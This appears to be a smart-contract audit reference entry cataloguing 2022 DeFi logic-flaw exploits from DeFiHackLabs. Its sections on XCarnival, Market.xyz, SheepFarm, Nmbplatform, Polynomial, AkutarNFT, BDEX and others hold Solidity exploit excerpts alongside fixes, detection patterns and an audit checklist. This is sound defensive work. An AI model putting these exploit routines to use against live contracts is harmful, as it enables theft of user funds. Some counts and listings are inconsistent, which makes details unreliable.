---
protocol: Multi-Protocol
chain: Ethereum, BSC, Polygon, Fantom, Optimism
category: business_logic
vulnerability_type: Protocol Logic Flaws

# Pattern Identity (Required)
root_cause_family: stale_accounting
pattern_key: Protocol Logic Flaws |  |  | Fund theft, permanent fund lock, full protocol drain

# Interaction Scope
interaction_scope: cross_protocol
attack_type:
  - NFT pledge invalidation bypass
  - Game economics abuse
  - Decimal calculation error
  - Read-only reentrancy via Curve
  - Flash loan reward manipulation
  - Arbitrary external call abuse
  - Auction DoS via reverting fallback
  - Public strategy function sandwich
source: DeFiHackLabs
total_exploits_analyzed: 12
total_losses: "$40M+"
affected_component:
  - Lending pools
  - NFT collateral vaults
  - GameFi contracts
  - Curve LP oracles
  - Staking reward contracts
  - Zap contracts
  - Auction refund mechanisms
  - Strategy vault functions
primitives:
  - flash_loan
  - price_manipulation
  - reentrancy
  - state_inconsistency
  - dos
  - approval_abuse
severity: CRITICAL
impact: Fund theft, permanent fund lock, full protocol drain
exploitability: Medium to High
financial_impact: "$40M+ aggregate"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "bid"
  - "XToken"
  - "borrow"
  - "approve"
  - "collect"
  - "deposit"
  - "dumpETH"
  - "harvest"
  - "orderId"
  - "require"
  - "_exploit"
  - "_xftmOut"
  - "compound"
  - "register"
  - "selector"
path_keys:
  - "nft_pledge_record_not_invalidated_after_withdrawal"
  - "read_only_reentrancy_via_curve_lp_pricing"
  - "game_economics_abuse_via_unrestricted_registration"
  - "decimal_miscalculation_in_synthetic_minting"
  - "flash_loan_reward_price_manipulation"
  - "arbitrary_external_call_in_zap_contract"
tags:
  - defihacklabs
  - protocol-logic
  - business-logic
  - nft-pledge
  - read-only-reentrancy
  - game-economics
  - decimal-error
  - curve-reentrancy
  - auction-dos
  - approval-abuse
  - reward-manipulation
  - strategy-sandwich
---

# DeFiHackLabs Protocol Logic Flaw Patterns (2021-2022)

## References & Source Reports

| Label | Source | Path / URL |
|-------|--------|------------|
| [AKUTARNFT-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-04/AkutarNFT_exp.sol` |
| [BDEX-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-11/BDEX_exp.sol` |
| [FANTASM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-03/Fantasm_exp.sol` |
| [MARKET-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/Market_exp.sol` |
| [NMBPLATFORM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-12/Nmbplatform_exp.sol` |
| [POLYNOMIAL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-11/Polynomial_exp.sol` |
| [SEAMAN-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/SEAMAN_exp.sol` |
| [SHEEPFARM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-11/SheepFarm_exp.sol` |
| [SHEEPFARM2-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-11/SheepFarm2_exp.sol` |
| [XCARNIVAL-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-06/XCarnival_exp.sol` |

---


## Overview

This entry catalogs 12 protocol logic flaw exploits from 2021-2022 sourced from [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs). These represent vulnerabilities where the core protocol logic — not just access control or math — was fundamentally flawed, enabling attackers to extract value through creative abuse of intended functionality.

**Categories covered:**
1. **NFT Pledge Record Not Invalidated** — Phantom collateral multiplication
2. **Game Economics Abuse** — Unrestricted registration spam for reward inflation
3. **Decimal Miscalculation in Minting** — Inflated synthetic asset output
4. **Read-Only Reentrancy via Curve** — Stale LP pricing during remove_liquidity callback
5. **Flash Loan Reward Price Manipulation** — AMM-based reward oracle inflation
6. **Arbitrary External Call in Zap** — Approval drain via crafted calldata
7. **Auction DoS via Reverting Fallback** — Permanent refund blockage
8. **Public Strategy Function Sandwich** — Externally callable price-moving swap

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `stale_accounting` |
| Pattern Key | `Protocol Logic Flaws |  |  | Fund theft, permanent fund lock, full protocol drain` |
| Severity | CRITICAL |
| Impact | Fund theft, permanent fund lock, full protocol drain |
| Interaction Scope | `cross_protocol` |
| Chain(s) | Ethereum, BSC, Polygon, Fantom, Optimism |


## Vulnerability Description

### Root Cause Analysis

Protocol logic flaws arise when the contract's state machine allows transitions that violate implicit invariants. Unlike simple access-control bugs, these require understanding the full protocol flow to identify:

1. **State Invalidation Gaps**: When an action (e.g., NFT withdrawal) doesn't clean up all related state (e.g., pledge records), creating "phantom" references that can be reused (XCarnival — $3.87M)
2. **Unconstrained Loops in Economics**: When functions like `register()` have no per-user limits, allowing attackers to inflate their reward share (SheepFarm)
3. **Cross-Contract State Read Timing**: When one contract reads state from another mid-transaction, before the source contract has finalized its state update (Market.xyz/Curve — $180K)
4. **Oracle-Dependent Reward Calculations**: When staking rewards are priced from spot AMM pools that can be flash-loan-manipulated (Nmbplatform)
5. **Unvalidated Calldata Forwarding**: When user-supplied calldata is forwarded to external calls without restricting the target function selector (Polynomial — $1.4K)
6. **DoS-Susceptible Iteration**: When refund/distribution loops send ETH to arbitrary addresses that can revert, blocking all subsequent recipients (AkutarNFT — $34M locked)
7. **Publicly Callable Internal Operations**: When strategy functions meant for keepers are externally callable, enabling sandwich attacks (BDEX)

### Attack Scenarios

**Scenario 1: Phantom NFT Pledge Multiplication (XCarnival)**
```
1. Attacker owns 1 BAYC NFT
2. Loop 33 times:
   - Deploy payload contract → transfer NFT → pledgeAndBorrow(0) → withdrawNFT() → transfer NFT back
   - Each iteration creates a valid orderId that persists after withdrawal
3. Loop 33 times:
   - Call borrow(orderId, 36 ETH) on each phantom pledge
4. Result: 33 × 36 = 1,188 ETH borrowed with 0 real collateral
```

**Scenario 2: Read-Only Reentrancy (Market.xyz)**
```
1. Aave flash loan 15.4M WMATIC + Balancer flash loan 34.6M WMATIC + 19.7M stMATIC
2. Add liquidity to Curve stMATIC/WMATIC pool → get LP tokens
3. Deposit LP into Beefy Vault → mint CTokens (collateral on Market)
4. Call remove_liquidity → Curve sends MATIC via callback BEFORE updating state
5. Inside receive(): borrow 250K MAI — collateral valued at stale (inflated) Curve state
6. Liquidate position, repay flash loans, profit
```

**Scenario 3: Flash Loan Reward Inflation (Nmbplatform)**
```
1. Stake GNIMB tokens into 3 staking contracts, wait 8 days
2. DODO flash loan + Biswap flash swap → acquire massive WBNB
3. Swap all WBNB → NIMB on Nimbus Router (spot price manipulation)
4. Call getReward() on all staking contracts → rewards calculated at inflated NIMB price
5. Swap everything back, repay flash loans, profit
```

---

## Vulnerable Pattern Examples

### Pattern 1: NFT Pledge Record Not Invalidated After Withdrawal

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: 3,087 ETH (~$3.87M) | **Protocol**: XCarnival | **Chain**: Ethereum

The `XNFT.pledgeAndBorrow()` creates a pledge order, but `withdrawNFT()` does not invalidate the `orderId`. The same orderId can be reused to borrow from the `XToken` lending pool after the NFT has been withdrawn.

```solidity
// @audit-issue orderId persists after NFT withdrawal — phantom collateral
contract payloadContract {
    uint256 orderId;
    
    function makePledge() public {
        BAYC.setApprovalForAll(address(XNFT), true);
        // @audit Creates pledge record with a new orderId
        XNFT.pledgeAndBorrow(address(BAYC), 5110, 721, address(doNothing), 0);
        orderId = XNFT.counter();
        // @audit NFT withdrawn but orderId remains valid in storage
        XNFT.withdrawNFT(orderId);
        // NFT returned to main contract for reuse in next iteration
        BAYC.transferFrom(address(this), msg.sender, 5110);
    }
    
    function dumpETH() public {
        // @audit Borrows against the phantom pledge — no NFT backing it
        XToken.borrow(orderId, payable(address(this)), 36 ether);
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Attack orchestrator creates 33 phantom pledges with 1 NFT
function testExploit() public {
    for (uint8 i = 0; i < 33; ++i) {
        payloadContract payload = new payloadContract();
        BAYC.transferFrom(address(this), address(payload), 5110);
        payload.makePledge(); // NFT returns to this contract each time
    }
    for (uint8 i = 0; i < 33; ++i) {
        payloads[i].dumpETH(); // 33 × 36 ETH = 1,188 ETH drained
    }
}
```

**Reference**: [DeFiHackLabs/src/test/2022-06/XCarnival_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/XCarnival_exp.sol) | TX: `0xf70f691d...`

---

### Pattern 2: Read-Only Reentrancy via Curve LP Pricing

> **pathShape**: `callback-reentrant`

**Severity**: 🔴 CRITICAL | **Loss**: ~$180K | **Protocol**: Market.xyz (MAI Finance) | **Chain**: Polygon

During `remove_liquidity`, Curve sends native tokens via callback **before** updating internal pool state. If a lending market reads the Curve pool's virtual price during this callback, it sees a stale (inflated) value, allowing over-borrowing.

```solidity
// @audit-issue Curve pool state is stale during remove_liquidity callback
function _exploit() internal {
    // Step 1: Add massive liquidity to Curve stMATIC/WMATIC pool
    vyperContract.add_liquidity(
        [uint256(19_664_260 ether), uint256(49_999_999 ether)], 0
    );
    
    // Step 2: Deposit LP into Beefy Vault → use as collateral on Market
    unitroller.enterMarkets(market);
    beefyVault.deposit(90_000 ether);
    CErc20_mmooCurvestMATIC_MATIC_4.mint(beefyVault.balanceOf(address(this)));
    
    // Step 3: Remove liquidity — triggers reentrancy via native token callback
    // @audit Curve sends MATIC before updating reserves/virtualPrice
    vyperContract.remove_liquidity(
        stMATIC_f.balanceOf(address(this)),
        [uint256(0), uint256(0)],
        true  // use_eth = true → sends native token → triggers receive()
    );
}

// @audit-issue Borrow during stale Curve state → inflated collateral valuation
receive() external payable {
    // Beefy vault reads stale Curve virtual price → collateral appears worth more
    CErc20Delegate_mMAI_4.borrow(250_000 ether);
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/Market_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/Market_exp.sol) | TX: `0xb8efe839...`

---

### Pattern 3: Game Economics Abuse via Unrestricted Registration

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: BNB (variable) | **Protocol**: SheepFarm | **Chain**: BSC

The `register()` function has no per-user call limit, allowing an attacker to spam registrations to inflate referral (neighbor) rewards. Combined with minimal BNB investment, the attacker extracts rewards far exceeding their deposit.

```solidity
// @audit-issue No per-user registration limit — reward inflation
function testExploit() public payable {
    // Step 1: Register 200 times to inflate neighbor reward multiplier
    for (uint8 i = 0; i < 200; i++) {
        sheepFram.register(neighbor);  // @audit No check if already registered
    }
    
    // Step 2: Minimal BNB investment
    sheepFram.addGems{value: 5 * 1e14}();  // Only 0.0005 BNB
    
    // Step 3: Upgrade village using inflated rewards
    for (uint8 i = 0; i < 3; i++) {
        sheepFram.upgradeVillage(i);
    }
    
    // Step 4: Sell village for accumulated (inflated) rewards
    sheepFram.sellVillage();
    
    // Step 5: Withdraw — profit >> initial investment
    sheepFram.withdrawMoney(20_000);
}

// Variant: Multi-contract + selfdestruct recycling (SheepFarm2)
// Spawns 4 AttackContracts, each registers 402 times, extracts 156K wool
constructor() payable {
    for (uint256 i; i < 402; ++i) {
        Farm.register(neighbor);  // @audit Same bug, more iterations
    }
    Farm.addGems{value: 5e14}();
    for (uint256 i; i < 5; ++i) {
        Farm.upgradeVillage(i);
    }
    Farm.sellVillage();
    Farm.withdrawMoney(156_000);
    selfdestruct(payable(msg.sender));  // Recycle BNB to spawner
}
```

**Reference**: [DeFiHackLabs/src/test/2022-11/SheepFarm_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SheepFarm_exp.sol) + [SheepFarm2_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SheepFarm2_exp.sol)

---

### Pattern 4: Decimal Miscalculation in Synthetic Minting

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: Variable (xFTM drained) | **Protocol**: Fantasm Finance | **Chain**: Fantom

The `pool.mint()` function computes `_xftmOut` with a decimal error, producing significantly more synthetic xFTM tokens than the FSM collateral warrants. The attacker provides FSM, receives inflated xFTM, then calls `collect()` in the next block.

```solidity
// @audit-issue Decimal error in mint() → inflated xFTM output
function testExploit() public {
    // Transfer FSM tokens to attacker
    cheat.prank(0x9362e8cF30635de48Bdf8DA52139EEd8f1e5d400);
    fsm.transfer(address(this), 100_000_000_000_000_000_000); // 100 FSM
    
    fsm.approve(address(pool), type(uint256).max);
    
    // @audit mint() has decimal miscalculation — _xftmOut >> expected
    pool.mint(100_000_000_000_000_000_000, 1); // minOut=1 is sufficient
    
    // Collect in next block
    cheat.roll(32_971_743);
    pool.collect(); // @audit Receives drastically inflated xFTM
}
```

**Reference**: [DeFiHackLabs/src/test/2022-03/Fantasm_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/Fantasm_exp.sol) | Chain: Fantom, Block: 32,971,742

---

### Pattern 5: Flash Loan Reward Price Manipulation

> **pathShape**: `atomic`

**Severity**: 🔴 CRITICAL | **Loss**: GNIMB + NIMB (significant) | **Protocol**: Nmbplatform (Nimbus) | **Chain**: BSC

Staking reward contracts calculate rewards based on AMM spot price of GNIMB/NIMB. Flash-loaning massive WBNB and swapping into NIMB inflates the price, causing `getReward()` to return enormously inflated reward amounts.

```solidity
// @audit-issue Reward calculation uses manipulable AMM spot price
function BiswapCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
    // Convert all flash-loaned WBNB to native → wrap to NBU_WBNB
    WBNB.withdraw(WBNB.balanceOf(address(this)));
    NBU_WBNB.deposit{value: address(this).balance}();
    
    NBU_WBNB.approve(address(NimbusRouter), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = address(NBU_WBNB);
    path[1] = address(NIMB);
    
    // @audit Massive swap → NIMB price skyrockets on AMM
    NimbusRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        NBU_WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
    );
    
    // @audit getReward() reads inflated NIMB price → enormous rewards
    user1.getReward();
    user2.getReward();
    user3.getReward();
    
    // Swap everything back, repay flash loans, profit
}
```

**Reference**: [DeFiHackLabs/src/test/2022-12/Nmbplatform_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Nmbplatform_exp.sol) | TX: `0x7d2d8d2c...`

---

### Pattern 6: Arbitrary External Call in Zap Contract

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: ~$1.4K | **Protocol**: Polynomial (Zap) | **Chain**: Optimism

The `swapAndDeposit` function accepts user-supplied `swapTarget` and `swapData` without restricting callable addresses or function selectors. The attacker impersonates a token/vault by implementing `balanceOf()`, `approve()`, and `initiateDeposit()`, then crafts calldata to call `transferFrom(victim, attacker, balance)` on USDC.

```solidity
// @audit-issue Arbitrary swapTarget + swapData → approval drain
function executeSwapAndDeposit(address victim) internal {
    uint256 amount = USDC.allowance(victim, address(zaps));
    // @audit swapData encodes transferFrom(victim, attacker, amount)
    bytes memory data = abi.encodeWithSelector(
        bytes4(0x23b872dd), // transferFrom selector
        victim,
        address(this),
        amount
    );
    
    // @audit swapTarget = USDC, depositToken = address(this), vault = address(this)
    // Attack contract implements balanceOf/approve/initiateDeposit to pass checks
    zapContract.swapAndDeposit(
        victim,
        ETH_ADDRESS,
        address(this),       // depositToken = fake (this contract)
        address(USDC),       // swapTarget = USDC
        address(this),       // vault = fake (this contract)
        0,
        data                 // transferFrom(victim → attacker)
    );
}

// Attack contract masquerades as token and vault
function balanceOf(address) public pure returns (uint256) { return 1; }
function approve(address, uint256) public pure returns (bool) { return true; }
function initiateDeposit(address, uint256) external {}
```

**Reference**: [DeFiHackLabs/src/test/2022-11/Polynomial_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/Polynomial_exp.sol) | TX: `0x9f34ae04...`

---

### Pattern 7: Auction DoS via Reverting Fallback + Permanent Fund Lock

> **pathShape**: `callback-reentrant`

**Severity**: 🔴 CRITICAL | **Loss**: >$34M locked permanently | **Protocol**: AkutarNFT | **Chain**: Ethereum

Two combined logic flaws: (1) `processRefunds()` iterates over all bidders and sends ETH — if any bidder is a contract that reverts, the entire function fails, blocking all refunds. (2) `claimProjectFunds()` has a `require` condition that can never be satisfied, permanently locking auction proceeds.

```solidity
// @audit-issue DoS: Reverting fallback blocks all refund processing
// Malicious contract bids in auction, then reverts on refund
contract MaliciousBidder {
    function bid() external payable {
        akutarNft.bid{value: 3.5 ether}(1);
    }
    
    // @audit Any ETH received causes revert → processRefunds() fails for everyone
    fallback() external payable {
        revert("CAUSE REVERT !!!");
    }
}

// After auction ends:
// akutarNft.processRefunds() → iterates bidders → sends ETH to malicious contract
// → revert → ALL honest bidders blocked from receiving refunds

// @audit-issue Permanently locked funds: impossible require condition
function testclaimProjectFunds() public {
    address ownerOfAkutarNFT = 0xCc0eCD808Ce4fEd81f0552b3889656B28aa2BAe9;
    cheats.warp(1_650_672_435);
    cheats.prank(ownerOfAkutarNFT);
    try akutarNft.claimProjectFunds() {}
    catch Error(string memory Exception) {
        // @audit "claimProjectFunds() ERROR" — require can never be satisfied
        // ~$34M in auction proceeds locked FOREVER
        console.log("claimProjectFunds() ERROR : ", Exception);
    }
}
```

**Reference**: [DeFiHackLabs/src/test/2022-04/AkutarNFT_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-04/AkutarNFT_exp.sol) | Block: 14,636,844

---

### Pattern 8: Public Strategy Function Enables Sandwich Attack

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: ~BNB profit | **Protocol**: BDEX | **Chain**: BSC

The `BvaultsStrategy.convertDustToEarned()` function — intended for internal/keeper use — is externally callable by anyone. It performs a swap that moves the BDEX/WBNB pair price, enabling a sandwich attack.

```solidity
// @audit-issue Publicly callable strategy function enables sandwich
function testExploit() public {
    uint256 amountin = 34 ether; // WBNB
    
    // Step 1: Buy BDEX (front-run)
    WBNB.transfer(address(Pair), amountin);
    uint256 amountout = getAmountOut(amountin, reserveWBNB, reserveBDEX);
    Pair.swap(amountout, 0, address(this), "");
    
    // Step 2: Trigger strategy's internal swap (moves price further)
    // @audit Anyone can call this — no access control
    vaultsStrategy.convertDustToEarned();
    
    // Step 3: Sell BDEX at inflated rate (back-run)
    uint256 amountBDEX = BDEX.balanceOf(address(this));
    BDEX.transfer(address(Pair), amountBDEX);
    Pair.swap(0, amountWBNB, address(this), "");
    // Profit: amountWBNB > amountin
}
```

**Reference**: [DeFiHackLabs/src/test/2022-11/BDEX_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/BDEX_exp.sol) | Block: 22,629,431

---

### Pattern 9: Token Transfer Side-Effect Price Manipulation

> **pathShape**: `atomic`

**Severity**: 🟠 HIGH | **Loss**: USDT profit | **Protocol**: SEAMAN | **Chain**: BSC

The SEAMAN token's `transfer()` triggers side effects (rebase/fee mechanism tied to GVC token price) when small amounts are sent to the pair. Repeatedly transferring 1 wei of SEAMAN 20 times manipulates the GVC/USDT exchange rate.

```solidity
// @audit-issue Token transfer side effects manipulate paired token price
function testExploit() external {
    // Flash loan 800K USDT
    DPPAdvanced(dodo).flashLoan(800_000 * 1e18, 0, address(this), new bytes(1));
}

function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
    USDTToSEAMAN();  // Buy tiny amount of SEAMAN
    USDTToGVC();     // Buy GVC with 500K USDT
    
    // @audit 20 × 1 wei transfers trigger cumulative side effects on pair
    for (uint256 i = 0; i < 20; i++) {
        SEAMAN.transfer(Pair, 1);  // Each transfer distorts GVC price
    }
    
    GVCToUSDT();  // @audit Sell GVC at manipulated (inflated) rate
    // Repay flash loan, keep USDT profit
}
```

**Reference**: [DeFiHackLabs/src/test/2022-10/SEAMAN_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/SEAMAN_exp.sol) | Block: 23,467,515

---

## Impact Analysis

| Protocol | Date | Loss | Root Cause Category | Chain |
|----------|------|------|---------------------|-------|
| XCarnival | Jun 2022 | ~$3.87M | NFT pledge not invalidated | Ethereum |
| AkutarNFT | Apr 2022 | >$34M locked | DoS + impossible require | Ethereum |
| Market.xyz | Oct 2022 | ~$180K | Curve read-only reentrancy | Polygon |
| Nmbplatform | Dec 2022 | Significant | Flash loan reward manipulation | BSC |
| Fantasm | Mar 2022 | Variable | Decimal calculation error | Fantom |
| Polynomial | Nov 2022 | ~$1.4K | Arbitrary external call | Optimism |
| SheepFarm | Nov 2022 | BNB profit | Game economics abuse | BSC |
| SheepFarm2 | Nov 2022 | BNB profit | Same (multi-contract variant) | BSC |
| BDEX | Nov 2022 | ~BNB profit | Public strategy sandwich | BSC |
| SEAMAN | Oct 2022 | USDT profit | Transfer side-effect manipulation | BSC |
| Audius | Jul 2022 | ~$1.08M | Unguarded proxy re-initialization | Ethereum |
| Rikkei | Apr 2022 | Full rUSDC | Unprotected oracle setter | BSC |

**Aggregate**: Over $40M in losses from protocol logic flaws alone in 2022.

---

## Secure Implementation

### Fix 1: Invalidate State on Withdrawal (XCarnival Pattern)

```solidity
// SECURE: Delete or invalidate pledge record on NFT withdrawal
function withdrawNFT(uint256 orderId) external {
    PledgeOrder storage order = pledgeOrders[orderId];
    require(order.pledger == msg.sender, "Not pledger");
    require(order.borrowed == 0, "Outstanding borrow");
    
    // Transfer NFT back to pledger
    IERC721(order.nftAddress).transferFrom(address(this), msg.sender, order.tokenId);
    
    // @audit-fix Invalidate the pledge record completely
    order.isActive = false;
    order.pledger = address(0);
    order.nftAddress = address(0);
    order.tokenId = 0;
    
    emit NFTWithdrawn(orderId, msg.sender);
}

function borrow(uint256 orderId, uint256 amount) external {
    PledgeOrder storage order = pledgeOrders[orderId];
    // @audit-fix Verify pledge is still active before allowing borrow
    require(order.isActive, "Pledge not active");
    require(order.pledger != address(0), "Invalid pledge");
    // ... proceed with borrow
}
```

### Fix 2: Use TWAP or Chainlink for Reward Pricing (Nmbplatform Pattern)

```solidity
// SECURE: Use time-weighted average price instead of spot price
contract StakingRewardFixedAPY {
    IUniswapV2Oracle public twapOracle;
    uint256 public constant TWAP_PERIOD = 30 minutes;
    
    function getRewardTokenPrice() internal view returns (uint256) {
        // @audit-fix TWAP resists flash loan manipulation
        return twapOracle.consult(
            address(rewardToken),
            1e18,
            TWAP_PERIOD
        );
    }
    
    function getReward() external {
        uint256 earned = _earned(msg.sender);
        uint256 price = getRewardTokenPrice();
        // @audit-fix Price cannot be manipulated within a single transaction
        uint256 rewardValue = earned * price / 1e18;
        require(rewardValue <= maxRewardCap, "Reward exceeds cap");
        // ... distribute reward
    }
}
```

### Fix 3: Pull-Based Refunds (AkutarNFT Pattern)

```solidity
// SECURE: Pull pattern prevents DoS from reverting recipients
contract SecureAuction {
    mapping(address => uint256) public pendingRefunds;
    
    function processRefunds() external onlyOwner {
        for (uint256 i = 0; i < bidders.length; i++) {
            // @audit-fix Credit refund instead of sending — no external call
            pendingRefunds[bidders[i]] += bidAmounts[bidders[i]];
        }
    }
    
    // @audit-fix Each user claims their own refund — one revert doesn't block others
    function claimRefund() external {
        uint256 amount = pendingRefunds[msg.sender];
        require(amount > 0, "No refund");
        pendingRefunds[msg.sender] = 0;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

### Fix 4: Restrict External Call Targets (Polynomial Pattern)

```solidity
// SECURE: Whitelist swap targets and validate calldata
contract SecureZap {
    mapping(address => bool) public whitelistedTargets;
    
    function swapAndDeposit(
        address depositToken,
        address swapTarget,
        bytes calldata swapData
    ) external {
        // @audit-fix Only allow whitelisted DEX routers as swap targets
        require(whitelistedTargets[swapTarget], "Invalid swap target");
        
        // @audit-fix Verify calldata doesn't call transferFrom/approve
        bytes4 selector = bytes4(swapData[:4]);
        require(
            selector != IERC20.transferFrom.selector &&
            selector != IERC20.approve.selector,
            "Forbidden selector"
        );
        
        (bool success, ) = swapTarget.call(swapData);
        require(success, "Swap failed");
    }
}
```

### Fix 5: Access Control for Strategy Functions (BDEX Pattern)

```solidity
// SECURE: Restrict strategy functions to authorized keepers
contract SecureBvaultsStrategy {
    mapping(address => bool) public keepers;
    
    modifier onlyKeeper() {
        require(keepers[msg.sender] || msg.sender == owner(), "Not keeper");
        _;
    }
    
    // @audit-fix Only authorized keepers can trigger price-affecting swaps
    function convertDustToEarned() external onlyKeeper {
        // ... perform dust conversion swap
    }
}
```

---

## Detection Patterns

### Static Analysis

```yaml
- pattern: "withdraw.*NFT|removeCollateral|unstake"
  check: "Verify all related state (pledge records, order IDs, collateral mappings) is invalidated"
  
- pattern: "register|signup|enroll"
  check: "Verify per-user call limits or deduplication logic"
  
- pattern: "remove_liquidity.*true|removeLiquidity.*eth"
  check: "Check for read-only reentrancy via native token callback"
  
- pattern: "getReward|claimReward|harvest"
  check: "Verify reward price doesn't use manipulable spot AMM price"
  
- pattern: "\\.call\\(.*swapData|target\\.call\\(data\\)"
  check: "Verify swap target is whitelisted and calldata is validated"
  
- pattern: "for.*send\\(|for.*transfer\\(|for.*call\\{value"
  check: "Verify DoS resistance — use pull pattern for ETH distribution"
  
- pattern: "convertDustToEarned|compound|harvest"
  check: "Verify access control on price-moving strategy functions"
  
- pattern: "mint.*decimal|_xftmOut|_tokenOut"
  check: "Verify decimal arithmetic consistency across all calculation paths"
```

### Invariant Checks

```
INV-LOGIC-001: After NFT withdrawal, no valid pledge/order record should reference that NFT
INV-LOGIC-002: Reward value per epoch must be bounded regardless of spot price changes
INV-LOGIC-003: Collateral valuation must not change during a single transaction's callback
INV-LOGIC-004: Refund/distribution mechanisms must complete even if individual recipients revert
INV-LOGIC-005: User-supplied calldata must not invoke privileged token operations (transferFrom, approve)
INV-LOGIC-006: Per-user registration/participation must be bounded (1 registration per address)
INV-LOGIC-007: Synthetic token output must be proportional to input within defined decimal precision
INV-LOGIC-008: Strategy functions that move market prices must have access controls
INV-LOGIC-009: Token transfer side effects must not alter paired token exchange rates
INV-LOGIC-010: claimProjectFunds() require conditions must be satisfiable post-auction
```

---

## Audit Checklist

- [ ] **NFT/Collateral Lifecycle**: After withdrawal, can any reference (orderId, pledge record) still be used to borrow or interact with lending pools?
- [ ] **Read-Only Reentrancy**: Does the protocol read LP virtual prices from Curve/Balancer during callbacks? Are those prices accurate mid-removal?
- [ ] **Game Economics**: Can `register()`, `deposit()`, or similar functions be called unlimited times to inflate rewards?
- [ ] **Reward TWAP**: Are staking rewards calculated from spot AMM prices (flash-loan-manipulable) or TWAP/oracle prices?
- [ ] **Arbitrary Calls**: Does any function forward user-supplied calldata to arbitrary targets? Is the target whitelisted? Is the selector validated?
- [ ] **DoS in Loops**: Does any loop send ETH to user-controlled addresses? Can a reverting recipient block all others?
- [ ] **Decimal Consistency**: Are all mint/burn calculations consistent in decimal handling across token pairs?
- [ ] **Strategy Access Control**: Can external callers invoke keeper-only functions like `convertDustToEarned()`, `compound()`, or `harvest()`?
- [ ] **Transfer Side Effects**: Do token transfers trigger rebases, fees, or state changes that affect paired token prices?
- [ ] **Fund Withdrawal Logic**: Can `claimProjectFunds()` or similar owner-withdrawal functions actually execute? Are require conditions satisfiable?

---

## Real-World Examples

| Protocol | Date | Loss | TX/Reference |
|----------|------|------|-------------|
| XCarnival | Jun 2022 | ~$3.87M | [Etherscan](https://etherscan.io/tx/0xf70f691d30ce23786cfb3a1522cfd76d159aca8d) |
| AkutarNFT | Apr 2022 | >$34M locked | Block 14,636,844 |
| Market.xyz | Oct 2022 | ~$180K | [PolygonScan](https://polygonscan.com/tx/0xb8efe839da0c89daa763f39f30577dc21937ae351c6f99336a0017e63d387558) |
| Nmbplatform | Dec 2022 | Significant | [BSCScan](https://bscscan.com/tx/0x7d2d8d2cda2d81529e0e0af90c4bfb39b6e74fa363c60b031d719dd9d153b012) |
| Fantasm | Mar 2022 | Variable | Block 32,971,742 (Fantom) |
| Polynomial | Nov 2022 | ~$1.4K | [OptimismScan](https://optimistic.etherscan.io/tx/0x9f34ae044cbbf3f1603769dcd90163add48348dde7e1dda41817991935ebfa2f) |
| SheepFarm | Nov 2022 | BNB profit | [BSCScan](https://bscscan.com/tx/0x5735026e5de6d1968ab5baef0cc436cc0a3f4de4ab735335c5b1bd31fa60c582) |
| BDEX | Nov 2022 | ~BNB profit | [BSCScan](https://bscscan.com/tx/0xe7b7c974e51d8bca3617f927f86bf907a25991fe654f457991cbf656b190fe94) |
| SEAMAN | Oct 2022 | USDT profit | [BSCScan](https://bscscan.com/tx/0x6f1af27d08b10caa7e96ec3d580bf39e29fd5ece00abda7d8955715403bf34a8) |
| Audius | Jul 2022 | ~$1.08M | [Etherscan](https://etherscan.io/tx/0xfefd829e246002a8fd061eede7501bccb6e244a9aacea0ebceaecef5d877a984) |
| Rikkei | Apr 2022 | Full rUSDC | Block 16,956,474 (BSC) |

---

## Keywords

protocol_logic_flaw, nft_pledge_invalidation, phantom_collateral, read_only_reentrancy, curve_reentrancy, game_economics_abuse, unrestricted_registration, decimal_miscalculation, synthetic_minting_error, flash_loan_reward_manipulation, reward_price_manipulation, arbitrary_external_call, approval_drain, auction_dos, reverting_fallback, permanent_fund_lock, impossible_require, public_strategy_function, strategy_sandwich, token_transfer_side_effect, defihacklabs, XCarnival, AkutarNFT, Market_xyz, Nmbplatform, Fantasm, Polynomial, SheepFarm, BDEX, SEAMAN, Audius, Rikkei
